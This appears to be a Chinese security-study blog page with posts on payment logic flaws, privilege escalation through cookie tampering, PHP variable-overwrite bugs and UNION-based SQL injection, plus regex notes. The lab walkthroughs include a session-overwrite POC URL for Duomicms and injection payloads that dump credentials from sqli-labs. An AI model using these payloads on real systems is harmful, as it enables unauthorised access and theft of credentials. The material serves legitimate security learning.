<p>4、对支付参数进行MD5加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题</p>
<p>5、金额超过一定值，进行人工审核</p>
<p>6、限制用户对商品的支付次数</p>
<h2 id="靶场实践"><a href="#靶场实践" class="headerlink" title="靶场实践"></a>靶场实践</h2><p>找到了一个很辣眼睛的CMS<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uujelhkej31h90p8gud.jpg" alt><br>我们先进行注册用户<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uujv998nj31h90ilwkt.jpg" alt><br>我们点击商品中心<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uuk97z1bj31hc0oa10b.jpg" alt><br>发现他的购买数量没进行限制，还可以填入负数，这就连传包的力气都省… 那我们填入-10000试试<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uukm40dfj31ha0o9qa7.jpg" alt><br>提交<br> 发现报错<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uullzk2dj31gt0q0q5j.jpg" alt><br>我们先不管，先返回看看<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uul2tmojj31hc0nuq9d.jpg" alt><br>我们发现我账户余额多了92000块</p>
<hr>
<p>我搜到一篇文章，我觉得总结的挺好的，推荐一下：<a href="https://secpulse.com/archives/67080.html" target="_blank" rel="noopener">挖洞技巧：支付漏洞之总结</a></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-平行越权、垂直越权" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/平行越权、垂直越权/" class="article-date">
      <time datetime="2019-12-06T17:03:10.496Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/平行越权、垂直越权/">平行越权、垂直越权</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="越权漏洞描述"><a href="#越权漏洞描述" class="headerlink" title="越权漏洞描述"></a>越权漏洞描述</h2><p>越权访问，这类漏洞是指应用在检查授权(Authorization)时存在纰漏，使得攻击者在获得低权限用户帐后后，可以利用一些方式绕过权限检查，访问或者操作到原本无权访问的高权限功能。在实际的代码安全审查中，这类漏洞往往很难通过工具进行自动化检测，因此在实际应用中危害很大。其与未授权访问有一定差别。目前存在着两种越权操作类型：横向越权操作(平行越权)和纵向越权操作(垂直越权)。</p>
<ul>
<li><strong>水平越权漏洞</strong>，是一种“基于数据的访问控制”设计缺陷引起的漏洞。由于服务器端在接收到请求数据进行操作时没有判断数据的所属人而导致的越权数据访问漏洞。如服务器端从客户端提交的request参数(用户能够控制的数据)中获取用户id，恶意攻击者通过变换请求ID的值，查看或修改不属于本人的数据。</li>
<li><strong>垂直越权漏洞</strong>，也称为权限提升，是一种“基于URL的访问控制”设计缺陷引起的漏洞。由于Web应用程序没有做权限控制或者仅在菜单上做了权限控制，导致恶意用户只要猜测其他管理页面的URL，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn5h46bnj30ty0fggno.jpg" alt></li>
</ul>
<p>我们可以这么说<strong>把握住传参就能把握住逻辑漏洞的命脉</strong>，其实渗透测试也是同一道理，漏洞是不会无缘无故产生。</p>
<h3 id="越权思路"><a href="#越权思路" class="headerlink" title="越权思路"></a>越权思路</h3><p>登入用户A，正常更改或者是查看A用户信息，然后抓取数据包，将传参ID修改为其他用户，如果成功查看或者修改了同权限其他用户的信息就属于水平越权测试(当然如果可以影响到更高权限的用户就是垂直越权漏洞)</p>
<p>传参ID参数需要自己检测(常见：uid= id= user= 等)通常使用brup进行爆破传参(传参可能在GET POST COOKIE中)</p>
<p>常见的平行越权(不需要输入原密码的修改密码，抓包该改用户或者用户ID修改他人密码)进行查看订单信息，遍历订单id等。</p>
<h3 id="越权漏洞实例与类型"><a href="#越权漏洞实例与类型" class="headerlink" title="越权漏洞实例与类型"></a>越权漏洞实例与类型</h3><ol>
<li>通过修改GET传参来越权<a href="http://www.anquan.us/static/bugs/wooyun-2016-0205340.html" target="_blank" rel="noopener">GET越权实例</a></li>
<li>修改POST传参进行越权<a href="http://www.anquan.us/static/bugs/wooyun-2016-0207583.html" target="_blank" rel="noopener">POST越权实例</a></li>
<li>修改cookie传参进行越权<a href="http://www.anquan.us/static/bugs/wooyun-2016-0184633.html" target="_blank" rel="noopener">COOKIE越权实例</a></li>
</ol>
<p>还有一类叫做<strong>未授权访问</strong>，严格意义上而言这个不属于越权漏洞，但是在日常的测试中常常会遇见</p>
<p>(只要<strong>输入正确对应身份的网址就可以直接访问</strong>，例如/admin默认是登录，登陆后跳转到user.php然后直接访问user.php，发现你直接有后台权限)</p>
<h2 id="靶场实际"><a href="#靶场实际" class="headerlink" title="靶场实际"></a>靶场实际</h2><p>靶场是一个很老的保修系统，虽然很老，但是还是有些网站还在使用(BWSsoft维修系统)<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn66xuz7j31h80pydo1.jpg" alt="2"><br>我们想要去做一个越权，那我们需要先有一个普通用户的使用权限，我们看到了注册按钮，于是我们进行了注册，获得了一个普通用户身份。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn6kpdp3j31hc0p2dnr.jpg" alt="3"><br>我们点击物品保修，并抓个包看看。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3snle4qokj30z40rkabo.jpg" alt="4"><br>我们发现cookie中存在登陆用户的信息传参，那我们是否能对其数据更改进行越权<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn7bm6blj31a00mt0vp.jpg" alt="5"><br>我们看到admin=0，那管理员的admin传参是不是要等于1呢，我改了一下，但是没用，后面我看到了一个shenfen的传参，两个一起修改才有效呢，管理员的参数值一般为1(true)，那我们试一下。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn7p34boj30v80oswhs.jpg" alt="6"><br>发现改完以后出现了后台管理的按钮<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn84pl6pj31hc0q2wmh.jpg" alt="7"><br>我们点击进去<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn8f7fi1j31hc0hltak.jpg" alt="8"><br>发现成功进去后台。</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-变量覆盖" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/变量覆盖/" class="article-date">
      <time datetime="2019-12-06T17:03:10.491Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/变量覆盖/">变量覆盖</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="变量覆盖介绍"><a href="#变量覆盖介绍" class="headerlink" title="变量覆盖介绍"></a>变量覆盖介绍</h2><p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击；变量覆盖漏洞有时候可以直接让我们获取Webshell，拿到服务器权限； </p>
<p>经常导致变量覆盖漏洞场景有：<strong>$$，extract()函数，parse_str()函数，import_request_variables()使用不当，开启了全局变量注册等。</strong></p>
<h2 id="变量覆盖函数解析"><a href="#变量覆盖函数解析" class="headerlink" title="变量覆盖函数解析"></a>变量覆盖函数解析</h2><h3 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h3><p>extract() 函数从数组中将变量导入到当前的符号表。<strong>该函数使用数组键名作为变量名，使用数组键值作为变量值。</strong>针对数组中的每个元素，将在当前符号表中创建对应的一个变量。具体函数介绍：<a href="http://www.w3school.com.cn/php/func_array_extract.asp" title="具体函数介绍" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_array_extract.asp</a></p>
<p><strong>示例一：</strong></p>
<p>将键值 “Cat”、”Dog” 和 “Horse” 赋值给变量 $a、$b 和 $c：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;Original&quot;;</span><br><span class="line">$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);</span><br><span class="line">extract($my_array);</span><br><span class="line">echo &quot;\$a = $a; \$b = $b; \$c = $c&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">//运行结果：$a = Cat; $b = Dog; $c = Horse</span><br></pre></td></tr></table></figure></p>
<p>成功将变量a覆盖</p>
<p><strong>示例二：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id=1;  </span><br><span class="line">extract($_GET);</span><br><span class="line">echo $id;</span><br><span class="line">?&gt;</span><br><span class="line">//提交：?id=123</span><br><span class="line">//结果： 123</span><br></pre></td></tr></table></figure>
<p>成功将变量id覆盖:</p>
<p><strong>extract()函数防御:</strong></p>
<p><strong>在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖  extract($_GET,EXTR_SKIP);</strong></p>
<h3 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str()变量覆盖"></a>parse_str()变量覆盖</h3><p>parse_str() 函数把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。用法参考：<a href="http://www.w3school.com.cn/php/func_string_parse_str.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_parse_str.asp</a></p>
<p><strong>示例一：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">parse_str(&quot;name=allblue&amp;age=18&quot;);</span><br><span class="line">echo $name  //输出allblue</span><br><span class="line">echo $age   //输出18</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p><strong>parse_str()函数防御:</strong><br>只能在传参前添加判断语句，判断变量是否存在；</p>
<p>tips：parse_str()类似的函数还有mb_parse_str()，用法基本一致。</p>
<h3 id="导致变量覆盖问题"><a href="#导致变量覆盖问题" class="headerlink" title="$$导致变量覆盖问题"></a>$$导致变量覆盖问题</h3><p>使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求?id=2 会将$id的值覆盖，$id=2。</p>
<p><strong>示例一：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a=1;</span><br><span class="line">foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $request)&#123;</span><br><span class="line">foreach ($$_request as $_key=&gt;$_value)</span><br><span class="line">&#123;$$_key=addslashes($_value);&#125;&#125;</span><br><span class="line">echo $a;     //通过传入参数实现变量覆盖</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="import-request-variables变量覆盖"><a href="#import-request-variables变量覆盖" class="headerlink" title="import_request_variables变量覆盖"></a>import_request_variables变量覆盖</h3><p>import_request_variables 函数可以在 register_global = off 时，把 GET/POST/Cookie 变量导入全局作用域中。</p>
<p>import_request_variables ( string $types , string $prefix )</p>
<p>将 GET／POST／Cookie 变量导入到全局作用域中, types 参数指定需要导入的变量, G代表GET，P代表POST，C代表COOKIE.</p>
<p><strong>示例一：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = 1;    </span><br><span class="line">import_request_variables(&apos;GP&apos;);   </span><br><span class="line">print_r($a);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>此页面当使用GET或POST传递$a变量时，会将原变量的值覆盖。</p>
<p>值得注意的是：此函数只能用在 PHP4.1 ~ PHP5.4之间。<br>此函数是非常危险的函数，在PHP5.5之后已被官方删除，假如你任然在使用低版本的PHP环境，也建议你避免使用此函数。</p>
<p>###全局变量覆盖<br>register_globals的意思就是注册为全局变量，所以当On的时候，传递过来的值会被直接的注册为全局变量直接使用，而Off的时候，我们需要到特定的数组里去得到它。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">//?id=1</span><br><span class="line">echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; </span><br><span class="line">echo &apos;$_GET[&quot;id&quot;] :&apos;.$_GET[&apos;id&apos;].&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;$id :&apos;.$id;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>当register_globals=Off的时候，下一个程序接收的时候应该用$_GET[‘id’]来接受传递过来的值；</p>
<p>当register_globals=On的时候，下一个程序可以直接使用$id来接受值,也可以用$_GET[‘id’]来接受传递过来的值。</p>
<p>tips：如果上面的代码中，已经对变量$id赋了初始值，比如$id=0，那么即使在URL中有/test.php?id=1，也不会将变量覆盖，id值为0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; </span><br><span class="line">if (ini_get(&apos;register_globals&apos;)) foreach($_REQUEST as $k=&gt;$v) unset($&#123;$k&#125;);  </span><br><span class="line">print $a.&quot;&lt;br/&gt;&quot;;  </span><br><span class="line">print $_GET[b];  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在register_globals=ON时,</p>
<p>提交/test.php?a=1&amp;b=2 , 变量$a未初始化,$_GET[b]=2</p>
<p>提交/test.php??GLOBALS[a]=1&amp;b=2,$a=1,$_GET[b]=2</p>
<p>tips:　从 PHP » 4.2.0 版开始配置文件中 PHP 指令 register_globals 的默认值从 on 改为 off 了,自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除</p>
<h2 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h2><p>靶场环境：Duomicmsx2.0；<br>审计工具：seay源码审计系统；<br>因为我们做的是变量覆盖的题目，所有我们先在seay源码审计系统加上一条匹配$$的正则匹配规则:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([^\$&quot;]|$)\$\&#123;?\$</span><br></pre></td></tr></table></figure></p>
<p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd18kavzj31970nqwja.jpg" alt></p>
<p>通过审计工具的自动审计功能来审计可能存在的漏洞：</p>
<p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd1kgorfj31hc0smtlz.jpg" alt></p>
<p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd1y1tssj31az0myajn.jpg" alt><br>最后寻找，发现了foreach和$$结合的变量覆盖漏洞</p>
<p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd29fa65j319j0pyaga.jpg" alt></p>
<p>找到了文件覆盖，但是我们需要找到可以调用覆盖的地方，我们先搜索包含commond.php的文件，看看能不能在其关联的文件中找到可利用代码</p>
<p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd2k0sthj31ap0qwwl5.jpg" alt><br>最后我们找到一个包含了common.php和check.admin.php的文件login.php</p>
<p>我们发现check.admin.php是通过获取用户登录时的id来判断用户的权限，是不是管理员<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd2vgj7aj31gw0sewo8.jpg" alt></p>
<p>而在admin.manager.php有一个判断，直接根据判断传进来的$groupid来进行身份验证。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd34m68bj31hc0smqb6.jpg" alt></p>
<p>如果传进来的session值为1，那么就是管理员的权限</p>
<p>通过构造POC使得duomi_group_id=1,就可以登录系统管理员，POC如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface/comment.php?_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_id]=1&amp;_SESSION[duomi_admin_name]=admin</span><br></pre></td></tr></table></figure>
<p>我们进去后台登录界面<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3da67rj31hc0pv40b.jpg" alt><br>后台没有管路员密码登录不上<br>插入我们构造的POC：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3nw2muj31hb0r80u8.jpg" alt><br>插入成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3vn3gej31hc0pm76u.jpg" alt><br>进入后台页面，发现没密码，自动成功登录。</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-zhengzebiaodashi" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/zhengzebiaodashi/" class="article-date">
      <time datetime="2019-12-06T17:03:10.487Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/zhengzebiaodashi/">正则表达式</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>正则表达式（类似查找文件）(Regular Expression)是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为”元字符”）<br>正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以<code>用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等</code>。</p>
<h2 id="正则函数"><a href="#正则函数" class="headerlink" title="正则函数"></a>正则函数</h2><ul>
<li><strong>preg_match ( string $pattern , string $subject ,  [array &amp;$matches] )</strong></li>
</ul>
<p>pattern：要搜索的模式，字符串类型，正则表达式 。</p>
<p>subject：输入字符串。 </p>
<p>matches：可选，存储匹配结果的数组。</p>
<p>作用是：执行一个正则表达式匹配，成功返回 1 ，否则返回 0</p>
<ul>
<li><p><strong>preg_replace<br>(正则，替换的字符串，匹配的字符串）</strong><br>将所有的匹配正则的字符串进行替换；</p>
<p><code>通常可以用来过滤敏感字符</code></p>
<ul>
<li><strong>preg_match_grep()</strong><br>匹配一个匹配正则的子字符数组，包含匹配的字符串</li>
</ul>
</li>
</ul>
<ul>
<li><strong>preg_match_all(正则，匹配的字符串，输出的二维数组</strong><h1 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h1></li>
</ul>
<hr>
<p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。<br>正则表达式的限定符有：</p>
<p>正则表达式的限定符有：</p>
<h3 id="字符描述"><a href="#字符描述" class="headerlink" title="字符描述:"></a>字符描述:</h3><p> *匹配前面的子表达式零次或多次。例如，zo<em> 能匹配 “z” 以及 “zoo”。</em> 等价于{0,}。</p>
<p> + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</p>
<p>?    匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</p>
<p>{n}    n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</p>
<p>{n,}    n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</p>
<p>{n,m}    m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</p>
<h1 id="总结元字符："><a href="#总结元字符：" class="headerlink" title="总结元字符："></a>总结元字符：</h1><hr>
<p>\<br>将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\‘ 匹配 “\” 而 “(“ 则匹配 “(“。</p>
<p>^<br>匹配输入字符串的开始位置。</p>
<p>$<br>匹配输入字符串的结束位置。</p>
<p>*<br>匹配前面的子表达式零次或多次。</p>
<p>+<br>匹配前面的子表达式一次或多次。<br>?<br>匹配前面的子表达式零次或一次。</p>
<p>{n}<br>n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</p>
<p>{n,}<br>n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</p>
<p>{n,m}<br>m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</p>
<p>\d<br>匹配一个数字字符。</p>
<p>\D<br>匹配一个非数字字符。</p>
<p>\d<br>匹配一个数字字符。</p>
<p>\D<br>匹配一个非数字字符。</p>
<p>\f<br>匹配一个换页符。</p>
<p>\n<br>匹配一个换行符。</p>
<p>\r<br>匹配一个回车符。</p>
<p>\s<br>匹配任何空白字符，包括空格、制表符、换页符等等。</p>
<p>\S<br>匹配任何非空白字符。</p>
<p>\w<br>匹配字母、数字、下划线。</p>
<p>\W<br>匹配非字母、数字、下划线。</p>
<hr>
<h3 id="记得在php中使用正则表达式用-分界！"><a href="#记得在php中使用正则表达式用-分界！" class="headerlink" title="记得在php中使用正则表达式用/分界！"></a>记得在php中使用正则表达式用/分界！</h3>
      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-zhengze" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/zhengze/" class="article-date">
      <time datetime="2019-12-06T17:03:10.483Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/zhengze/">sql注入：显错注入</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p><br>(在这里我们用sqli-lab为例)<br><br><strong>我们首先要检查是否会有注入漏洞，and 1=1法显示不出错误信息，我们尝试用’测试，发现出现错误信息，也证明有注入漏洞。<br></strong><br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/sxw6wE4Na9CwDf2J95VFD5xdrWGvCDy8zYhOwrWEgRY!/b/dFIBAAAAAAAA&amp;bo=gQb5AIEG.QADCSw!&amp;rf=viewer_4" alt><br><strong><br>我们根据错误信息知道多出一个多余的’ 那我们应该怎么样才能使多余的’ 语法让sql语句正确回显呢?<br></strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure></p>
<p><strong>我们通过注释后面的语句注释掉，使得引号闭合；</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos;--+</span><br></pre></td></tr></table></figure>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/4tl2YYuvPIdxpHq7.lhk5zQhLLEB8fqesx4UuLyV.PU!/b/dFMBAAAAAAAA&amp;bo=IgVTASIFUwEDGTw!&amp;rf=viewer_4" alt><br><strong>测试字段数,发现order by 4出错，3则正常显示，说明字段为3<br>（order by 是mysql用来排序的，我们可以通过他来测试字段数）：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos; order by 3--+</span><br></pre></td></tr></table></figure>
<p><strong>测试回显点，发现回显位是2，3</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/u7xpdeuVSeeKngk.j13h3LAfU1eMVgdCH9T.CWlDrHo!/b/dL8AAAAAAAAA&amp;bo=qwShAAAAAAADByw!&amp;rf=viewer_4" alt></p>
<p><strong>查询版本号，如果是5.0以上,则可以用系统库查询</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,version()--+</span><br></pre></td></tr></table></figure>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.kj.wKY22UkPB5mLbk*udHdjiJAigOznbz0cagNMwHY!/b/dLgAAAAAAAAA&amp;bo=EAXjAAAAAAADB9Q!&amp;rf=viewer_4" alt></p>
<p><strong>查询数据库名</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,database()--+</span><br></pre></td></tr></table></figure>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.5pOBR2yPrgiR7sZUOs61G1LI6Xy58TDwHEpGb6Lb2g!/b/dFQBAAAAAAAA&amp;bo=NgbXAAAAAAADF9U!&amp;rf=viewer_4" alt><br><strong>通过数据库 系统库information的tables表查询表名(查询下个表，可以通过移动偏移量limit来查询其他表</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1 --+</span><br></pre></td></tr></table></figure>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/F5g.75Q1PLQjwcFR2.hGo5O2VJ1mX0GKK4WHq7Pf9D8!/b/dL8AAAAAAAAA&amp;bo=5wTDAAAAAAADFxI!&amp;rf=viewer_4" alt></p>
<p><strong>再通过数据库 系统库的columns表查询列名，通过偏移limit来查询其他字段</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1 --+</span><br></pre></td></tr></table></figure>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/fogWx.4zppoo.XE51.8tPeW1tXIixEwyu.UH0prXdoA!/b/dLYAAAAAAAAA&amp;bo=zAStAAAAAAADF1c!&amp;rf=viewer_4" alt></p>
<p><strong>再来爆出字段里的内容</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,username,password from users limit 0,1--+</span><br></pre></td></tr></table></figure>
